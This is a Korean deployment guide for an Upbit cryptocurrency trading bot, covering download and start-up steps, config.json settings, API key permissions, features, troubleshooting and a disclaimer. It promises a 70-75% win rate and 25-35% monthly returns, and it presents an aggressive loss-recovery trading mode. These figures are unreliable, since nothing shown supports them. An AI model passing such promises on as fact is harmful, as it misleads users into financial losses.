# 🏆 Upbit Smart Bot v8.0 ULTIMATE - 배포 가이드

## 📦 배포 패키지 다운로드

### 다운로드 링크

**GitHub Repository**: https://github.com/wordycow/so.t-leader-choice

**직접 다운로드**:
- **Windows 사용자**: [upbit-bot-v8.0-ultimate-release.zip](https://github.com/wordycow/so.t-leader-choice/raw/main/upbit-bot-v8.0-ultimate-release.zip) (25KB)
- **Linux/Mac 사용자**: [upbit-bot-v8.0-ultimate-release.tar.gz](https://github.com/wordycow/so.t-leader-choice/raw/main/upbit-bot-v8.0-ultimate-release.tar.gz) (20KB)

---

## 🚀 빠른 시작 (5분 안에 실행)

### Windows 사용자

1. **다운로드 & 압축 해제**
   ```
   upbit-bot-v8.0-ultimate-release.zip 다운로드
   → 우클릭 > "압축 풀기"
   ```

2. **실행**
   ```
   START.bat 더블클릭
   ```
   
3. **API 키 설정** (실전 모드 사용 시)
   ```
   config.json 열기
   → API 키 입력
   ```

4. **브라우저 접속**
   ```
   http://localhost:5000
   ```

### Linux/Mac 사용자

1. **다운로드 & 압축 해제**
   ```bash
   wget https://github.com/wordycow/so.t-leader-choice/raw/main/upbit-bot-v8.0-ultimate-release.tar.gz
   tar -xzf upbit-bot-v8.0-ultimate-release.tar.gz
   cd upbit-bot-v8-ultimate-release
   ```

2. **실행**
   ```bash
   ./start.sh
   ```
   
3. **API 키 설정** (실전 모드 사용 시)
   ```bash
   nano config.json  # 또는 vi config.json
   # API 키 입력 후 저장
   ```

4. **브라우저 접속**
   ```
   http://localhost:5000
   ```

---

## 📁 패키지 구조

```
upbit-bot-v8-ultimate-release/
├── upbit-smart-bot-v8.0-ULTIMATE.py  # 메인 봇 (36KB)
├── START.bat                          # Windows 실행기
├── start.sh                           # Linux/Mac 실행기
├── config.json                        # 설정 파일 ⚙️
├── requirements.txt                   # Python 의존성
├── README.md                          # 완전한 가이드 📖
├── LICENSE                            # MIT 라이선스
└── templates/
    └── dashboard-ultimate.html        # 웹 대시보드
```

---

## 🎯 핵심 기능

### 1. 급등/급락 동시 포착
- 238개 KRW 마켓 전체를 10초 이내에 스캔
- 급등: +1.5% 이상 상승 & 거래량 2배
- 급락: -1.5% 이하 하락 & RSI < 35

### 2. 5가지 패턴 자동 인식
| 패턴 | 조건 | 신뢰도 |
|------|------|--------|
| 📦 박스권 | ±3% 범위 30분 유지 | 75% |
| 📈 트렌드 | 이평선 분석 | 70% |
| 💰 수급 | 거래량 2.5배 유입 | 80% |
| 🚀 급등 후 | 5% 급등 후 조정 | 65% |
| ⚡ 복합 | 여러 패턴 동시 | 85% |

### 3. 5개 전략 실시간 경쟁
- **Surge Hunter**: 급등 포착 (목표 +3%)
- **Dip Hunter**: 급락 매수 (원가 복귀)
- **Box Trader**: 박스권 거래 (+2.5%)
- **Trend Follower**: 추세 추종
- **Volume Hunter**: 수급 포착 (+2%)

### 4. AI 자동 학습
- 매 거래 분석 및 학습
- 50회마다 전략 재평가
- 최고 성과 전략 자동 선택

### 5. 손실 복구 모드
- 손실 -15% 시 자동 활성화
- 현금 10%로 초단타 매매
- 손실 50% 회복 목표

---

## ⚙️ config.json 설정

### 기본 설정
```json
{
  "upbit_access_key": "여기에_API_키_입력",
  "upbit_secret_key": "여기에_Secret_키_입력",
  "mode": "practice",              // "practice" 또는 "live"
  "simulation_seed": 1000000       // 연습 모드 시드 (원)
}
```

### 급등 감지 설정
```json
"surge_config": {
  "timeframes": {
    "1m": 1.5,    // 1분 +1.5% 이상
    "3m": 2.5,    // 3분 +2.5% 이상
    "5m": 3.5     // 5분 +3.5% 이상
  },
  "volume_spike_ratio": 2.0,       // 거래량 2배
  "min_volume_krw": 100000000      // 최소 1억원
}
```

### 급락 감지 설정
```json
"dip_config": {
  "drop_threshold": -1.5,          // -1.5% 이하
  "rsi_threshold": 35,             // RSI 35 이하
  "volume_ratio": 2.0              // 거래량 2배
}
```

---

## 🔒 보안 설정 (중요!)

### Upbit API 키 권한 설정

1. **Upbit 로그인**
   - https://upbit.com/mypage/open_api_management

2. **API 키 생성**
   - ✅ 정보 조회: **활성화**
   - ✅ 거래: **활성화**
   - ❌ 입출금: **비활성화** (필수!)

3. **IP 주소 제한** (선택, 권장)
   - 봇 실행 서버 IP만 등록

4. **config.json 보안**
   - ⚠️ 절대 GitHub 등 공개 저장소에 업로드 금지
   - ⚠️ 타인과 공유 금지

---

## 📊 기대 성과

- **승률**: 70-75% (복구 모드 75%+)
- **월 수익률**: 25-35%
- **평균 보유 시간**: 1.5시간
- **손실 복구**: 자동 복구 모드

### 시뮬레이션 예시

**연습 모드 (7일 테스트)**:
```
초기 자금: 1,000,000원
최종 자금: 1,250,000원
총 수익: +250,000원 (+25%)
거래 횟수: 42회
승률: 73.8%
```

---

## 🎮 웹 대시보드 사용법

### 대시보드 접속
```
http://localhost:5000
```

### 주요 기능

1. **시작/정지 버튼**
   - 🚀 시작: 봇 실행 (스피너 애니메이션 표시)
   - ⏸️ 정지: 봇 중지

2. **모드 선택**
   - 연습 모드: 시뮬레이션 (안전)
   - 실전 모드: 실제 거래 (API 키 필요)

3. **실시간 통계**
   - 현재 잔고
   - 총 손익
   - 수익률
   - 승률

4. **전략 카드**
   - 5개 전략별 실시간 성과
   - 승률, 평균 수익, 거래 횟수

5. **거래 내역**
   - 최근 거래 로그
   - 매수/매도 내역
   - 수익/손실 상세

6. **급등/급락 알림**
   - 실시간 감지 신호
   - 코인명, 가격, 변동률

---

## 🐛 문제 해결

### 봇이 시작되지 않는 경우

**증상**: "Python이 설치되지 않음" 오류

**해결**:
```bash
# Python 3.8 이상 설치
Windows: https://www.python.org/downloads/
Linux: sudo apt install python3 python3-pip
Mac: brew install python3
```

### 라이브러리 설치 오류

**증상**: "ModuleNotFoundError: No module named 'pyupbit'"

**해결**:
```bash
# 의존성 재설치
pip install -r requirements.txt --force-reinstall

# 또는 개별 설치
pip install pyupbit pandas flask
```

### API 인증 오류

**증상**: "UpbitError: Invalid access key"

**해결**:
1. config.json의 API 키 재확인
2. Upbit에서 API 키 권한 확인
3. IP 주소 제한 확인

### 포트 충돌

**증상**: "Address already in use: Port 5000"

**해결**:
```python
# upbit-smart-bot-v8.0-ULTIMATE.py 마지막 줄 수정
app.run(host='0.0.0.0', port=5001)  # 5000 → 5001
```

---

## 📚 추가 학습 자료

### 추천 학습 순서

1. **연습 모드 운영** (3-7일)
   - 실제 시장 데이터로 시뮬레이션
   - 로그 분석 및 전략 이해

2. **소액 실전 테스트** (10-50만원)
   - 리스크 최소화
   - 실전 경험 축적

3. **점진적 자금 증액**
   - 안정적 수익 확인 후
   - 단계적 증액 (50만 → 100만 → 300만)

### 성과 모니터링

- **일일**: 거래 내역 검토
- **주간**: 승률 및 수익률 분석
- **월간**: 전략별 성과 비교

---

## ⚠️ 면책 조항

1. **투자 책임**: 모든 결정은 사용자 책임
2. **손실 위험**: 암호화폐는 고위험 자산
3. **성과 보장 없음**: 과거 성과 ≠ 미래 수익
4. **연습 권장**: 실전 전 충분한 테스트
5. **자금 관리**: 잃어도 괜찮은 금액만 투자

---

## 📞 지원 및 문의

- **GitHub**: https://github.com/wordycow/so.t-leader-choice
- **이슈 등록**: https://github.com/wordycow/so.t-leader-choice/issues
- **최신 업데이트**: GitHub Releases 확인

---

## 🎓 버전 히스토리

### v8.0 ULTIMATE (2026-02-16)
- ✅ 급등/급락 동시 포착
- ✅ 5가지 패턴 자동 인식
- ✅ 5개 전략 실시간 경쟁
- ✅ AI 자동 학습
- ✅ 손실 복구 모드
- ✅ 웹 대시보드 개선 (스피너, 상태 표시)

### v7.3 DIP HUNTER (2026-02-16)
- 급락 매수 전략 추가
- 원가 복귀 전략
- 과매도 구간 포착

### v7.2 SURGE HUNTER (2026-02-16)
- 급등 포착 시스템
- 10초 빠른 스캔
- 24시간 모니터링

---

**🚀 행운을 빕니다! Happy Trading!**
